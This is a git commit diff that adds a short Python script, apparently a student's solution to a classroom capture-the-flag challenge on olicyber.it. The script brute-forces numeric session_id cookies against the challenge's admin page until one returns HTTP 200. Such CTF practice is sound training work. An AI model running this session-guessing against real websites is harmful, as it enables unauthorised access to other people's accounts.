9ee7b81415b15f7fb7d86f3c093301ef84655f28
LorenzoPatti03 <Lorenzo.pattipersonal@gmail.com>
2026-05-24 16:23:14 +0200

    utils

--- sfide_in_aula/SS/es1.py
+++ sfide_in_aula/SS/es1.py
@@ -1,2 +1,16 @@
-from pwn import *
+import requests
 
+s = requests.Session()
+url = 'http://too-small-reminder.challs.olicyber.it/admin'
+
+for i in range(10_000):
+    
+    r = s.get(url, cookies={"session_id" : f'{i}'})
+
+    
+    print(r.status_code, 'cookie: ', i )
+    if r.status_code == 200:
+        print(r.text)
+        break
+    
+ 
